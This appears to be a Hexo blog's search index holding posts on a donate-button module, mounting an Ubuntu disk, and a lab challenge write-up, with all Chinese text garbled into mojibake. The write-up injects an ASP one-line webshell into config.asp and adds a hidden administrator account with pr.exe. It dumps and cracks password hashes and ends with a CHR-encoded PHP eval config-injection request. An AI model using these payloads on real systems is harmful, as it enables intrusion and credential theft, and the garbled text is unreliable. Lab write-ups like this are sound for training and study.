class="attr">--</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="ç¬¬äºŒæ­¥-è®¾ç½®æ‰“èµæ¨¡å—æ ·å¼"><a href="#ç¬¬äºŒæ­¥-è®¾ç½®æ‰“èµæ¨¡å—æ ·å¼" class="headerlink" title="ç¬¬äºŒæ­¥: è®¾ç½®æ‰“èµæ¨¡å—æ ·å¼"></a>ç¬¬äºŒæ­¥: è®¾ç½®æ‰“èµæ¨¡å—æ ·å¼</h1><p><strong>source\css_partial</strong>ç›®å½•ä¸‹æ–°å»º<strong>donate.styl</strong> å†™å…¥</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.donate_bar</span> &#123;</span><br><span class="line"><span class="attribute">text-align</span>: center;</span><br><span class="line"><span class="attribute">margin-top</span>: <span class="number">5%</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.donate_bar</span> <span class="selector-tag">a</span><span class="selector-class">.btn_donate</span> &#123;</span><br><span class="line"><span class="attribute">display</span>: inline-block;</span><br><span class="line"><span class="attribute">width</span>: <span class="number">82px</span>;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">82px</span>;</span><br><span class="line"><span class="attribute">margin-left</span>: auto;</span><br><span class="line"><span class="attribute">margin-right</span>: auto;</span><br><span class="line"><span class="attribute">background</span>: <span class="built_in">url</span>(http://img.t.sinajs.cn/t5/style/images/apps_PRF/e_media/btn_reward.gif)<span class="built_in">no-repeat</span>;</span><br><span class="line"><span class="attribute">-webkit-transition</span>: background <span class="number">0s</span>;</span><br><span class="line"><span class="attribute">-moz-transition</span>: background <span class="number">0s</span>;</span><br><span class="line"><span class="attribute">-o-transition</span>: background <span class="number">0s</span>;</span><br><span class="line"><span class="attribute">-ms-transition</span>: background <span class="number">0s</span>;</span><br><span class="line"><span class="attribute">transition</span>: background <span class="number">0s</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.donate_bar</span> <span class="selector-tag">a</span><span class="selector-class">.btn_donate</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line"><span class="attribute">background-position</span>: <span class="number">0</span> -<span class="number">82px</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.donate_bar</span> <span class="selector-class">.donate_txt</span> &#123;</span><br><span class="line"><span class="attribute">display</span>: block;</span><br><span class="line"><span class="attribute">color</span>: <span class="number">#9d9d9d</span>;</span><br><span class="line"><span class="attribute">font</span>: <span class="number">14px</span>/<span class="number">2</span> <span class="string">&quot;Microsoft Yahei&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.donate_bar</span><span class="selector-class">.hidden</span>&#123;</span><br><span class="line"><span class="attribute">display</span>: none</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.post-donate</span>&#123;</span><br><span class="line"><span class="attribute">margin-top</span>: <span class="number">80px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#donate_guide</span>&#123;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">210px</span>;</span><br><span class="line"><span class="attribute">width</span>: <span class="number">420px</span>;</span><br><span class="line"><span class="attribute">margin</span>: <span class="number">0</span> auto;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#donate_guide</span> <span class="selector-tag">img</span>&#123;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å®Œæˆä»¥å åˆ‡è®°åœ¨    <strong>source\css\style.styl</strong>æ–‡ä»¶å†…æ·»åŠ <code>@import &#39;_partial/donate</code></p><h1 id="ç¬¬ä¸‰æ­¥-å°†æ¨¡å—æ•´åˆåˆ°æ–‡ç« å†…"><a href="#ç¬¬ä¸‰æ­¥-å°†æ¨¡å—æ•´åˆåˆ°æ–‡ç« å†…" class="headerlink" title="ç¬¬ä¸‰æ­¥: å°†æ¨¡å—æ•´åˆåˆ°æ–‡ç« å†…"></a>ç¬¬ä¸‰æ­¥: å°†æ¨¡å—æ•´åˆåˆ°æ–‡ç« å†…</h1><p>åœ¨<strong>layout_partial\article.ejs</strong>ä¸­çš„**<article> â€¦â€¦</article>**æ ‡ç­¾å†…éƒ¨æ·»åŠ ä»¥ä¸‹å†…å®¹:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;% if (!index &amp;&amp; theme.donate &amp;&amp; post.donate!=false)&#123; %&gt;</span><br><span class="line">&lt;%- partial(&#x27;donate&#x27;) %&gt;</span><br><span class="line">&lt;% &#125; %&gt;</span><br></pre></td></tr></table></figure><h1 id="æœ€å-ç¼–å†™é…ç½®æ–‡ä»¶"><a href="#æœ€å-ç¼–å†™é…ç½®æ–‡ä»¶" class="headerlink" title="æœ€å: ç¼–å†™é…ç½®æ–‡ä»¶"></a>æœ€å: ç¼–å†™é…ç½®æ–‡ä»¶</h1><p>æˆ‘ä»¬å¯ä»¥åœ¨ä¸»é¢˜çš„** _config.yml** æ–‡ä»¶ä¸­å…³é—­å’Œæ‰“å¼€æ‰“èµåŠŸèƒ½ï¼Œè¿˜å¯ä»¥è‡ªå®šä¹‰è®¾ç½®æ‰“èµæ–‡æ¡ˆã€‚</p><figure class="highlight plain"><figcaption><span>code</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#æ˜¯å¦å¼€å¯æ‰“èµåŠŸèƒ½</span><br><span class="line">donate: true</span><br><span class="line">#æ‰“èµæ–‡æ¡ˆ</span><br><span class="line">donate_message: æ¬£èµæ­¤æ–‡ï¼Ÿæ±‚é¼“åŠ±ï¼Œæ±‚æ”¯æŒï¼</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¦‚æœéœ€è¦å…³æ‰æ‰“ä¸ŠåŠŸèƒ½åªéœ€è¦ åœ¨æ–‡ç« ä¸­åŠ ä¸Š<code>donate: false</code>å³å¯~</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ubuntuç³»ç»Ÿæ–°å¢ç¡¬ç›˜ç©ºé—´</title>
      <link href="ubuntu-mount-new-disk.html"/>
      <url>ubuntu-mount-new-disk.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="ubuntu-æ·»åŠ æ–°ç¡¬ç›˜"><a href="#ubuntu-æ·»åŠ æ–°ç¡¬ç›˜" class="headerlink" title="ubuntu æ·»åŠ æ–°ç¡¬ç›˜"></a>ubuntu æ·»åŠ æ–°ç¡¬ç›˜</h1><p>æŸ¥çœ‹ç¡¬ç›˜ï¼š</p><pre><code># fdisk -l...Disk /dev/sdb: 274.9 GB, 274877906944 bytes255 heads, 63 sectors/track, 33418 cylinders, total     536870912 sectorsUnits = sectors of 1 * 512 = 512 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytesDisk identifier: 0x00000000Disk /dev/sdb doesn&#39;t contain a valid partition table</code></pre><p>å¯ä»¥çœ‹åˆ°ï¼Œæœ‰ä¸€å—å¤§å°ä¸º256Gçš„ç£ç›˜æœªåˆå§‹åŒ–</p><p>æ ¼å¼åŒ–ç¡¬ç›˜ï¼ˆå¦‚æœéœ€è¦å¤šä¸ªåˆ†åŒºï¼Œè¯·å…ˆåˆ›å»ºç£ç›˜åˆ†åŒºï¼‰ï¼š</p><pre><code># mkfs.ext4 /dev/sdbmke2fs 1.42.9 (4-Feb-2014)/dev/sdb is entire device, not just one partition!Proceed anyway? (y,n) yFilesystem label=OS type: LinuxBlock size=4096 (log=2)Fragment size=4096 (log=2)Stride=0 blocks, Stripe width=0 blocks16777216 inodes, 67108864 blocks3355443 blocks (5.00%) reserved for the super userFirst data block=0Maximum filesystem blocks=42949672962048 block groups32768 blocks per group, 32768 fragments per group8192 inodes per groupSuperblock backups stored on blocks:    32768, 98304, 163840, 229376, 294912, 819200, 884736, 1605632, 2654208,    4096000, 7962624, 11239424, 20480000, 23887872Allocating group tables: doneWriting inode tables: doneCreating journal (32768 blocks): doneWriting superblocks and filesystem accounting information: done</code></pre><p>æŸ¥çœ‹ç£ç›˜çš„UUIDï¼š</p><pre><code># blkid/dev/sda1: UUID=&quot;05003145-9b91-4943-aaa8-22cb496fd4d8&quot; TYPE=&quot;ext4&quot;/dev/sda5: UUID=&quot;ca0012ba-2bf1-4d0b-94d3-3e4043746a14&quot; TYPE=&quot;swap&quot;/dev/sdb: UUID=&quot;e23a1c1e-8d91-4df8-8fba-f0656a1080ab&quot; TYPE=&quot;ext4&quot;</code></pre><p>è®°å½•ä¸‹/dev/sdbï¼ˆåˆšæ‰æ ¼å¼åŒ–çš„åˆ†åŒºï¼‰çš„UUIDã€‚</p><p><em>æ³¨æ„ï¼šä½ çœ‹åˆ°çš„UUIDçš„å€¼ä¸ä¾‹å­ä¸åŒ</em></p><p>ç¼–è¾‘/etc/fstab</p><pre><code># editor /etc/fstab</code></pre><p>æ·»åŠ ä»¥ä¸‹è¡Œ</p><pre><code>UUID=e23a1c1e-8d91-4df8-8fba-f0656a1080ab    /home    ext4    defaults,errors=remount-ro    0    1</code></pre><p><strong><em>æ³¨æ„ï¼šUUIDæ›¿æ¢ä¸ºä¸Šä¸€æ­¥ä½ è·å–åˆ°çš„å€¼</em></strong></p><p><em>P.S.<code>/home</code>ä¸ºä½ è¦æŒ‚è½½çš„ç›®æ ‡ç›®å½•</em></p><p>ç°åœ¨é‡å¯ç”µè„‘ï¼Œåº”ç”¨æ–°çš„ç£ç›˜é…ç½®</p><pre><code># reboot</code></pre><p>æŸ¥çœ‹ç£ç›˜é…ç½®ï¼š</p><pre><code># df -hFilesystem      Size  Used Avail Use% Mounted on/dev/sda1       8.8G  1.3G  7.1G  15% /none            4.0K     0  4.0K   0% /sys/fs/cgroupudev            8.2G  4.0K  8.2G   1% /devtmpfs           1.7G  492K  1.7G   1% /runnone            5.0M  8.0K  5.0M   1% /run/locknone            8.2G     0  8.2G   0% /run/shmnone            100M     0  100M   0% /run/user/dev/sdb        252G   60M  239G   1% /home</code></pre></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> ç¯å¢ƒé…ç½® </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è¿™æ˜¯ä¸€æ³¢ ichunqiuåœ¨çº¿æŒ‘æˆ˜æ”»ç•¥ -(ä¸€)</title>
      <link href="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html"/>
      <url>%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="æˆ‘å¾ˆç®€å•ï¼Œä¸è¦æ¬ºè´Ÿæˆ‘"><a href="#æˆ‘å¾ˆç®€å•ï¼Œä¸è¦æ¬ºè´Ÿæˆ‘" class="headerlink" title="æˆ‘å¾ˆç®€å•ï¼Œä¸è¦æ¬ºè´Ÿæˆ‘"></a>æˆ‘å¾ˆç®€å•ï¼Œä¸è¦æ¬ºè´Ÿæˆ‘</h1><blockquote><ol><li>è·å–ç½‘ç«™åå°å¯†ç    </li><li>æå–æƒé™</li><li>è·å–æœåŠ¡å™¨å¯†ç </li></ol></blockquote><h2 id="åå°ç®¡ç†å¯†ç è·å–"><a href="#åå°ç®¡ç†å¯†ç è·å–" class="headerlink" title="åå°ç®¡ç†å¯†ç è·å–"></a>åå°ç®¡ç†å¯†ç è·å–</h2><p>åˆ°å¤„éƒ½æ˜¯æ³¨å…¥ç‚¹ ä¼šç”¨æ³¨å…¥å·¥å…·å°±èƒ½æ³¨å…¥å‡ºè´¦å·å¯†ç äº†æ¯”å¦‚<strong>Domain</strong> /<strong>é˜¿D</strong>/<strong>Pangolin</strong>/ç”šè‡³æ˜¯ç¥å™¨<strong>sqlmap</strong>éƒ½å¯ä»¥è§£å†³<br>è¯¦ç»†è¿‡ç¨‹æˆ‘å°±è·³è¿‡äº† æ²¡ä»€ä¹ˆæ„æ€ </p><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>æ‹¿åˆ°è´¦å·å¯†ç å åº”è¯¥æ˜¯æ‰¾åå°çš„ç™»é™†é¡µé¢<br>é¦–å…ˆå¯ä»¥è¿›è¡ŒçŒœæµ‹  <code>admin</code> æ¯”å¦‚è¿™æ ·å°±èƒ½è‡ªåŠ¨è·³å‡ºè·¯å¾„äº†</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-01" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-01"></a></p><p>è¿›å…¥åå°å åº”è¯¥æ˜¯è¦æƒ³åŠæ³•æ‹¿åˆ°shell<br>æ‹¿åˆ°shellæ–¹æ³•æœ‰å¾ˆå¤š</p><ol><li>ç›´æ¥ä¸Šä¼ æ‹¿shell</li><li>æ•°æ®åº“å¤‡ä»½æ‹¿shell</li><li>çªç ´æœ¬åœ°ä¸Šä¼ æ‹¿shell</li><li>ä¸Šä¼ å…¶ä»–è„šæœ¬ç±»å‹æ‹¿shell</li><li>æˆªæ–­</li><li>æœåŠ¡å™¨è§£ææ¼æ´</li><li>åˆ©ç”¨ç¼–è¾‘å™¨</li><li>ä¿®æ”¹é…ç½®æ–‡ä»¶</li><li>ä¿®æ”¹ç½‘ç«™æ¨¡æ¿</li></ol><p>æ‰¾ä¸åˆ°ä¸Šä¼ ç‚¹å¥½ç—›è‹¦â€¦çœ‹åˆ°é…ç½®æ–‡ä»¶å¯ä»¥ä¿®æ”¹ çœ¼ç›ä¸€äº®  æ­£å¥½è¯•è¯•æ–°åˆ°æ‰‹éƒ½ä¸€å¥è¯æœ¨é©¬èƒ½ä¸èƒ½ç”¨</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-02" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-02"></a></p><p>ç‚¹å‡»å·¦ä¾§çš„[ç³»ç»Ÿè®¾ç½®ç®¡ç†]â†’[ç½‘ç«™é…ç½®ä¿¡æ¯]ï¼Œéšä¾¿æ‰¾æ”¹åœ°æ–¹æ’å…¥ä¸€å¥è¯å°±å¥½  å¦‚ä¸Šå›¾<br>ä¹‹åç”¨èœåˆ€è¿æ¥  æˆ‘è¿™é‡Œä¸€å¥è¯æ˜¯chr(97))  97æ˜¯açš„Asciiç  æ‰€ä»¥ä¸€å¥è¯å¯†ç æ˜¯a<br><code>http://www.test.inchunqiu/inc/config.asp</code>è¿™æ˜¯è¿æ¥åœ°å€<br>è§£é‡Šä¸€ä¸‹ä¸ºä»€ä¹ˆæ˜¯è¿™é‡Œ<br>/nc/config.asp æºç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">Const SiteName&#x3D;&quot;é­…åŠ›ä¼ä¸šç½‘ç«™ç®¡ç†ç³»ç»Ÿ 2007 ä¸­è‹±ç¹å•†ä¸šæ­£å¼ç‰ˆ&quot;        &#39;ç½‘ç«™åç§°</span><br><span class="line">Const EnSiteName&#x3D;&quot;MSCOM 2007&quot;        &#39;ç½‘ç«™åç§°</span><br><span class="line">Const SiteTitle&#x3D;&quot;é­…åŠ›è½¯ä»¶&quot;        &#39;ç½‘ç«™æ ‡é¢˜</span><br><span class="line">Const EnSiteTitle&#x3D;&quot;MelyySoft&quot;        &#39;ç½‘ç«™æ ‡é¢˜</span><br><span class="line">Const SiteUrl&#x3D;&quot;www.melyysoft.com&quot;        &#39;ç½‘ç«™åœ°å€</span><br><span class="line">Const Miibeian&#x3D;&quot;æ¹˜ICPå¤‡05011184å·&quot;        &#39;ç½‘ç«™å¤‡æ¡ˆå·</span><br><span class="line">â€¦.</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>æ„é€ ä¸€å¥è¯æœ¨é©¬</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;%&gt;&lt;%Eval Request(Chr(97))%&gt;&lt;%&#39;</span><br></pre></td></tr></table></figure><p>æ’å…¥ä¸€å¥è¯æœ¨é©¬å</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">Const SiteName&#x3D;&quot;&quot;%&gt;&lt;%Eval Request(Chr(35))%&gt;&lt;% &#39;&quot;        &#39;ç½‘ç«™åç§°</span><br><span class="line">Const EnSiteName&#x3D;&quot;MSCOM 2007&quot;        &#39;ç½‘ç«™åç§°</span><br><span class="line">Const SiteTitle&#x3D;&quot;é­…åŠ›è½¯ä»¶&quot;        &#39;ç½‘ç«™æ ‡é¢˜</span><br><span class="line">Const EnSiteTitle&#x3D;&quot;MelyySoft&quot;        &#39;ç½‘ç«™æ ‡é¢˜</span><br><span class="line">Const SiteUrl&#x3D;&quot;www.melyysoft.com&quot;        &#39;ç½‘ç«™åœ°å€</span><br><span class="line">Const Miibeian&#x3D;&quot;æ¹˜ICPå¤‡05011184å·&quot;        &#39;ç½‘ç«™å¤‡æ¡ˆå·</span><br><span class="line">â€¦.</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>æ•´ç†è§„èŒƒä»¥å</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;%Const SiteName&#x3D;&quot;&quot;%&gt;</span><br><span class="line">&lt;%Eval Request(Chr(35))%&gt;</span><br><span class="line">&lt;% &#39;&quot;        &#39;ç½‘ç«™åç§°</span><br><span class="line">Const EnSiteName&#x3D;&quot;MSCOM 2007&quot;        &#39;ç½‘ç«™åç§°</span><br><span class="line">Const SiteTitle&#x3D;&quot;é­…åŠ›è½¯ä»¶&quot;        &#39;ç½‘ç«™æ ‡é¢˜</span><br><span class="line">Const EnSiteTitle&#x3D;&quot;MelyySoft&quot;        &#39;ç½‘ç«™æ ‡é¢˜</span><br><span class="line">Const SiteUrl&#x3D;&quot;www.melyysoft.com&quot;        &#39;ç½‘ç«™åœ°å€</span><br><span class="line">Const Miibeian&#x3D;&quot;æ¹˜ICPå¤‡05011184å·&quot;        &#39;ç½‘ç«™å¤‡æ¡ˆå·</span><br><span class="line">â€¦.</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æ’å…¥ä¸€å¥è¯æœ¨é©¬ä¸€å®šæ˜¯è¦ä¿è¯è¯­æ³•æ­£ç¡®æ‰èƒ½è¿æ¥æˆåŠŸ æ‰€ä»¥ä¸€å®šè¦æ³¨æ„é—­åˆ<br>ç”¨èœåˆ€è¿æ¥åˆšåˆšçš„åœ°å€</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-03" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-03"></a></p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-04" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-04"></a></p><p>åœ¨è¿™é‡Œä¸Šä¼  ææƒéƒ½å·¥å…·  è¿™é‡Œæˆ‘é€‰æ‹©ä½¿ç”¨<code>Pr</code></p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-05" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-05"></a></p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-07" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-07"></a></p><p>ä¸Šä¼ æˆåŠŸå å³é”®<code>cmd.exe</code> ä½¿ç”¨è™šæ‹Ÿç»ˆç«¯è¿æ¥</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-06" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-06"></a></p><p>ä¹‹åå¯ä»¥å¼€å§‹ææƒäº†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pr.exe &quot;net user hacker 123 &#x2F;add &amp; net localgroup administrators hacker &#x2F;add&quot;</span><br></pre></td></tr></table></figure><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-08" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-08"></a></p><p>çœ‹å›¾çš„å·¦ä¸‹è§’ å·²ç»å°†<code>swing</code>è¿™ä¸ªè´¦å·åŠ å…¥åˆ°ç®¡ç†å‘˜ç»„äº† ä¹‹åç”¨3389è¿æ¥å°±å¥½äº†<br>æ‰“å¼€[å¼€å§‹]â†’[è¿è¡Œ]â†’è¾“å…¥<strong>mstsc</strong>è¿æ¥åˆ°ç›®æ ‡æœºå°±å¥½äº† (ç›®æ ‡æœºIPå¯ä»¥åœ¨åœºæ™¯æ‹“æ‰‘å›¾é‡Œçœ‹åˆ°)<br>åœ¨è¿™ä¹‹å‰å…ˆæ‰“å¼€ 3389<br><code>pr 3389</code></p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-09" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-09"></a></p><p>è¿æ¥åˆ°ç›®æ ‡æœº</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-10" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-10"></a></p><h2 id="è·å–æœåŠ¡å™¨å™¨ç®¡ç†å¯†ç "><a href="#è·å–æœåŠ¡å™¨å™¨ç®¡ç†å¯†ç " class="headerlink" title="è·å–æœåŠ¡å™¨å™¨ç®¡ç†å¯†ç "></a>è·å–æœåŠ¡å™¨å™¨ç®¡ç†å¯†ç </h2><p>è¿™é‡Œæˆ‘é€‰æ‹©ç”¨<code>QuarksPwDum</code> å¯¹Hashçš„è·å–</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-11" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-11"></a></p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-12" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-12"></a></p><p>ä½¿ç”¨å›¾ä¸­çš„å‘½ä»¤ æ‰“å¼€å·¥å…·<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-13" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-13"></a></p><p>æˆåŠŸæ‰“å¼€<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-14" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-14"></a></p><p>ä½¿ç”¨å‘½ä»¤è·å–hash</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-15" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-15"></a></p><p>æˆåŠŸè·å–hash æ¥ä¸‹æ¥è¦å¯¹hashè¿›è¡Œè§£å¯† æ¯”å¦‚ [è¿™ä¸ªè¿æ¥</p><p>](<a href="http://www.objectif-securite.ch/en/ophcrack.php">http://www.objectif-securite.ch/en/ophcrack.php</a>)<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-16" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/web-test-16"></a></p><p><strong>Good è¿™æ ·å°±è§£å†³å•¦!!!</strong>  é¼“æŒä¸€ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">POST &#x2F;utility&#x2F;convert&#x2F;index.php?a&#x3D;config&amp;source&#x3D;d7.2_x2.0 HTTP&#x2F;1.1</span><br><span class="line"></span><br><span class="line">Host: www.test.ichunqiu</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 6.1; rv:25.0) Gecko&#x2F;20100101 Firefox&#x2F;2X.0</span><br><span class="line"></span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line"></span><br><span class="line">Accept-Language: zh-cn,zh;q&#x3D;0.8,en-us;q&#x3D;0.5,en;q&#x3D;0.3</span><br><span class="line"></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line"></span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">Content-Length: 199</span><br><span class="line"></span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">newconfig[aaa%0a%0deval(CHR(101).CHR(118).CHR(97).CHR(108).CHR(40).CHR(34).CHR(36).CHR(95).CHR(80).CHR(79).CHR(83).CHR(84).CHR(91).CHR(99).CHR(93).CHR(59).CHR(34).CHR(41).CHR(59));&#x2F;&#x2F;]&#x3D;aaaa&amp;submit&#x3D;yes</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> iæ˜¥ç§‹ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è®°ä¸€æ¬¡Hexoä¸»é¢˜ä¿®æ”¹</title>
      <link href="%E8%AE%B0%E4%B8%80%E6%AC%A1Hexo%E4%B8%BB%E9%A2%98%E7%9A%84%E4%BF%AE%E6%94%B9.html"/>
      <url>%E8%AE%B0%E4%B8%80%E6%AC%A1Hexo%E4%B8%BB%E9%A2%98%E7%9A%84%E4%BF%AE%E6%94%B9.html</url>
      
